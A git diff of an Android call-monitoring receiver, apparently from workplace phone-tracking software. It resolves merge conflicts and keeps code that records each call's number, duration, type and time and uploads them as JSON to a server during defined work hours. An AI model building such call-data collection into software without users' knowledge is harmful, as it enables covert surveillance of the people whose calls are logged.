@@ -40,39 +40,20 @@ public class CallReceiver extends BroadcastReceiver {
 		String call = sp.getString("call", "0");
 
 		if (call.equals("0")) {
-<<<<<<< HEAD
 			Logging.doLog(LOG_TAG, "call : 0", "call : 0");
-=======
-			Log.d(LOG_TAG, "KBD = 0");
-			FileLog.writeLog("CallReciver: KBD = 0");
-			
->>>>>>> refs/remotes/origin/war
 			return;
 		}
-		
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
-<<<<<<< HEAD
 			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
 					"isWork return " + Boolean.toString(isWork));
 			Logging.doLog(LOG_TAG, "after isWork retrun 0",
 					"after isWork retrun 0");
-=======
-			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: isDoWork return "
-					+ Boolean.toString(isWork));
->>>>>>> refs/remotes/origin/war
 
 			return;
 		} else {
-<<<<<<< HEAD
 			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
 					"isWork - " + Boolean.toString(isWork));
-=======
-			Log.d(LOG_TAG, Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: isWork return "
-					+ Boolean.toString(isWork));
->>>>>>> refs/remotes/origin/war
 		}
 
 		date = logTime();
@@ -96,7 +77,7 @@ public class CallReceiver extends BroadcastReceiver {
 				// когда уже знаем номер и факт звонка
 				try {
 					// TimeUnit.SECONDS.sleep(1);
-					TimeUnit.MILLISECONDS.sleep(1100);
+					TimeUnit.MILLISECONDS.sleep(1000);
 				} catch (InterruptedException e) {
 					e.printStackTrace();
 				}
@@ -166,7 +147,6 @@ public class CallReceiver extends BroadcastReceiver {
 			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
-<<<<<<< HEAD
 			object.put("time", date);
 			object.put("type", callTypeStr);
 			object.put("info", info);
@@ -183,10 +163,6 @@ public class CallReceiver extends BroadcastReceiver {
 
 		DataRequest dr = new DataRequest(ctx);
 		dr.sendRequest(sendJSONStr);
-=======
-		Log.d(LOG_TAG, sb.toString());
-		FileLog.writeLog("Callreciver: " + sb.toString());
->>>>>>> refs/remotes/origin/war
 	}
 
 	@SuppressLint("SimpleDateFormat")
